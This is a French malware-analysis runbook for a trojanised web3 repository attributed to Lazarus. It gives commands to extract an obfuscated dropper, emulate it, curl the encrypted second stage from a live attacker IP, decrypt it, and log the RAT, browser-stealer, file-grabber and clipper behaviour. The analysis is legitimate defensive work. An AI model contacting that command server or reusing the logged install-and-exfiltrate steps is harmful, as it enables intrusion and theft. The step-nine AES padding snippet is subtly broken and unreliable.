# Runbook : reproduction pas à pas (Lazarus Contagious Interview, pspn-main)

Étapes reproductibles pour cette analyse. Nécessite Python 3.10+ (`cryptography`), et un interpréteur JavaScript/Node compatible avec le module `vm` (voir section 3 si `node` n'est pas installé).

---

## 1. Triage initial de l'archive

```bash
sha256sum pspn-main.zip
unzip -l pspn-main.zip | head -20
unzip -oq pspn-main.zip -d pspn-main_extracted
cat pspn-main_extracted/pspn-main/README.md
```

Vérifier les dépendances déclarées dans `package.json` :

```bash
cat pspn-main_extracted/pspn-main/package.json | grep -A100 '"dependencies"'
# @primno/dpapi et node-machine-id sortent du lot pour un dashboard web3
```

Chercher un éventuel usage de ces deux paquets dans le code visible du dépôt (aucun trouvé au moment de l'analyse) :

```bash
grep -rl "dpapi\|machine-id\|machineId" pspn-main_extracted/pspn-main --include="*.js" --include="*.ts" --include="*.tsx"
```

---

## 2. Repérage de l'injection

```bash
find pspn-main_extracted/pspn-main -not -path "*/node_modules/*" -type f \
  -name "*.js" -exec wc -c {} \; | sort -n -r | head -5
# server/controllers/userController.js: 31763 octets pour 270 lignes -> ~117 octets/ligne,
# très supérieur aux autres fichiers du même répertoire (~35 octets/ligne)

sed -n '8p' pspn-main_extracted/pspn-main/server/controllers/userController.js | wc -c
# ligne 8 : 24892 octets, seule sur toute la ligne 8 du fichier
```

---

## 3. Extraction et préparation du bac à sable

```bash
python3 tools/extract_stage1.py \
  pspn-main_extracted/pspn-main/server/controllers/userController.js \
  tools/stage1_dropper_raw.js
```

Un interpréteur Node.js complet est nécessaire pour laisser le payload s'auto-décoder (voir `writeup.md` section 5.2 sur les limites d'une ré-implémentation Python de l'algorithme de décodage). En l'absence de `node` sur la machine d'analyse, un binaire Electron (VS Code) fait office d'interpréteur Node.js complet :

```bash
node --version 2>/dev/null || echo "node absent"

# Alternative : n'importe quel binaire Electron supporte ELECTRON_RUN_AS_NODE=1
ELECTRON_RUN_AS_NODE=1 /usr/share/code/code --version
# -> v24.15.0 (le numéro de version Node embarqué, pas la version de VS Code)
```

---

## 4. Émulation du stage 1

```bash
ELECTRON_RUN_AS_NODE=1 /usr/share/code/code tools/harness.js \
  tools/stage1_dropper_raw.js emu_stage1.json
```

Sortie attendue (extraits) :

```
[EMU:require] {"module":"os"}
[EMU:require] {"module":"fs"}
[EMU:require] {"module":"path"}
[EMU:require] {"module":"crypto"}
[EMU:require] {"module":"child_process"}
[EMU:child_process.execSync] {"cmd":"npm install axios socket.io-client --no-warnings --no-progress --loglevel silent", ...}
[EMU:require] {"module":"axios"}
[EMU:crypto.scryptSync] {"args":["99cef4b32f24dcc475a4e7be8d2423c4","salt",32], "ok":true}
[EMU:NETWORK.request] {"url":"http://147.189.172.105/api/service/99cef4b32f24dcc475a4e7be8d2423c4","opts":{"headers":{"Authentication":"jwt"}}}
```

`tools/harness.js` intercepte `require`, `fs`, `child_process` et tout appel réseau : rien n'est réellement écrit sur disque, aucun process n'est réellement lancé, aucune requête HTTP réelle n'est envoyée à ce stade (`NETWORK.request` journalise l'URL puis renvoie une réponse factice ou un rejet selon la configuration du harness, voir le code source pour le détail).

Pour valider le format exact attendu par le déchiffrement, faire échouer volontairement `crypto.createDecipheriv` avec un IV de mauvaise longueur permet d'observer les arguments réels (algorithme, clé dérivée) dans le journal, sans jamais faire aboutir de vrai déchiffrement à cette étape :

```
[EMU:crypto.createDecipheriv.THROW] {"args":["aes-256-cbc", "<clé 64 hex>", "<IV>"], "error":"Invalid initialization vector"}
```

Confirme : algorithme `aes-256-cbc`, clé dérivée de longueur 32 octets.

---

## 5. Récupération réelle du stage 2 (lecture seule)

```bash
curl -sS -m 20 -A "axios/1.7.9" -H "Authentication: jwt" \
  "http://147.189.172.105/api/service/99cef4b32f24dcc475a4e7be8d2423c4" \
  -D headers_stage2.txt -o stage2_response_raw.bin \
  -w "HTTP_STATUS:%{http_code} SIZE:%{size_download}\n"
```

Résultat attendu au moment de l'analyse (2026-07-27) : `HTTP_STATUS:200`, corps au format `<IV base64>:<ciphertext base64>`.

**Ne jamais exécuter le contenu reçu.** Il ne sert que d'entrée au déchiffrement statique de l'étape suivante.

---

## 6. Déchiffrement du stage 2

```bash
python3 tools/decrypt_stage2.py \
  99cef4b32f24dcc475a4e7be8d2423c4 \
  stage2_response_raw.bin \
  tools/stage2_decrypted.js
```

Sortie attendue :

```
[+] cle AES : 1bec2729bbab14b6dd113258f824bfb0df60b4a1051e479f1dce0d8b6af72abc
[+] 114745 octets dechiffres -> tools/stage2_decrypted.js
```

---

## 7. Émulation du stage 2 : découverte des 4 sous-modules

```bash
ELECTRON_RUN_AS_NODE=1 /usr/share/code/code tools/harness.js \
  tools/stage2_decrypted.js emu_stage2.json
```

Sortie attendue (extraits) :

```
[EMU:fs.writeFileSync] {"path":"/tmp/scdata", ...}
[EMU:child_process.exec] {"cmd":"npm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent &&  node scdata", ...}
[EMU:fs.writeFileSync] {"path":"/tmp/ldata", ...}
[EMU:child_process.exec] {"cmd":"npm i axios && node ldata", ...}
[EMU:child_process.spawn] {"cmd":"node","args":["-e","<code grabber>"], ...}
[EMU:child_process.spawn] {"cmd":"node","args":["-e","<code clipper>"], ...}
```

Extraction des sous-modules depuis le journal JSON (le harness journalise le contenu complet, pas seulement un aperçu tronqué) :

```bash
python3 - <<'EOF'
import json
log = json.load(open('emu_stage2.json'))
for e in log:
    if e['kind'] == 'fs.writeFileSync':
        name = e['data']['path'].strip('/').replace('/', '_')
        open(f"tools/stage3_{name}.js", 'w').write(e['data']['content'])
    if e['kind'] == 'child_process.spawn' and e['data']['args'][:1] == ['-e']:
        pass  # cas rare ; ici les scripts spawnés utilisent args=["-e", code]
    if e['kind'] == 'child_process.spawn':
        idx = log.index(e)
        code = e['data']['args'][1]
        open(f"tools/stage3_spawn_{idx}.js", 'w').write(code)
EOF
```

---

## 8. Émulation de chaque sous-module

```bash
for f in tools/stage3_scdata_rat.js tools/stage3_ldata_browser_stealer.js \
         tools/stage3_file_grabber.js tools/stage3_clipboard_monitor.js; do
  echo "=== $f ==="
  timeout 15 env ELECTRON_RUN_AS_NODE=1 /usr/share/code/code tools/harness.js "$f" "/tmp/emu_$(basename "$f").json"
done
```

Résultats attendus par module :

- **`stage3_scdata_rat.js`** : `require` de `socket.io-client`, `ssh2`, `node-pty` (après `npm install` intercepté) ; création d'un fichier verrou `/tmp/.npm/vhost.ctl` ; lecture de `/proc/cpuinfo` ; POST de télémétrie vers `/api/service/makelog` ; connexion Socket.IO vers `147.189.172.105:7861` avec 11 gestionnaires d'événements (`start-terminal`, `terminal-input`, `terminal-resize`, `stop-terminal`, `command`, `whour`, `kill`, `start_ssh`, `ssh_input`, `connect`, `disconnect`).
- **`stage3_ldata_browser_stealer.js`** : `require('form-data')`, vérifications `existsSync` sur les répertoires de profil Chrome/Edge/Brave/lt-browser.
- **`stage3_file_grabber.js`** : vérifications sur `os.homedir()` et `/mnt`, `require` de `form-data`/`axios`/`child_process`.
- **`stage3_clipboard_monitor.js`** : boucle infinie (`watchClipboard`), le process ne se termine pas naturellement (`timeout` nécessaire). Le harness écrit tout de même son journal après 1,5 s grâce au `setTimeout` de sortie forcée intégré.

Le script clipper ne rendant jamais la main naturellement, augmenter le budget `timeout` (par exemple à 8-15 s) permet d'observer davantage d'appels `execSync` (lecture effective du presse-papiers) si le premier cycle de la boucle ne s'est pas encore déclenché.

---

## 9. Vérification indépendante du déchiffrement AES

```bash
python3 -c "
import base64, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

data = open('stage2_response_raw.bin','rb').read()
iv_b64, ct_b64 = data.split(b':', 1)
iv, ct = base64.b64decode(iv_b64), base64.b64decode(ct_b64)
key = hashlib.scrypt(b'99cef4b32f24dcc475a4e7be8d2423c4', salt=b'salt', n=16384, r=8, p=1, dklen=32)
d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
pt = d.update(ct) + d.finalize()
pt = padding.PKCS7(128).unpadder().update(pt) + padding.PKCS7(128).unpadder().finalize()
print(len(pt), pt[:80])
"
```

---

## 10. Empreintes de tous les artefacts

```bash
sha256sum pspn-main.zip \
  pspn-main_extracted/pspn-main/server/controllers/userController.js \
  tools/stage1_dropper_raw.js \
  stage2_response_raw.bin \
  tools/stage2_decrypted.js \
  tools/stage3_scdata_rat.js \
  tools/stage3_ldata_browser_stealer.js \
  tools/stage3_file_grabber.js \
  tools/stage3_clipboard_monitor.js
```

Valeurs attendues : voir le tableau de la section 2 de `writeup.md`.
